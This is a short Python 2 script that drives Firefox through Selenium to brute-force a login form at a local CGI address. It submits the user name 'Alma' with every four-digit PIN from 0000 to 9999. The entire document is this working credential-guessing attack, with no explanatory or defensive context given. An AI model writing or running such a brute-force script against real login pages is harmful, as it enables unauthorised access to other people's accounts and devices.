from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

loginURL='http://10.10.1.20/cgi-bin/login.cgi'
binaryPath='/usr/bin/firefox'

binary = FirefoxBinary(binaryPath)
driver = webdriver.Firefox(firefox_binary=binary)
driver.implicitly_wait(60)

driver.get(loginURL)
inputElement_id = driver.find_element_by_name('login_id')
inputElement_psw = driver.find_element_by_name('login_pwd')
inputElement_link=driver.find_element_by_xpath("//*[@id='btn_login']")

counter = 0
psw_value=0000
max_value = 10000
print driver.current_url
currentURL=driver.current_url

for x in range(0, max_value):
    print "Loop count %04d" % (x)
    driver.get(loginURL)
    inputElement_id = driver.find_element_by_name('login_id')
    inputElement_psw = driver.find_element_by_name('login_pwd')
    inputElement_link=driver.find_element_by_xpath("//*[@id='btn_login']")
    inputElement_psw.clear()
    inputElement_id.clear()
    psw_value=format(x,"04d")
    inputElement_id.send_keys('Alma')    
    inputElement_psw.send_keys(psw_value)
    inputElement_link.click()
driver.close()
    
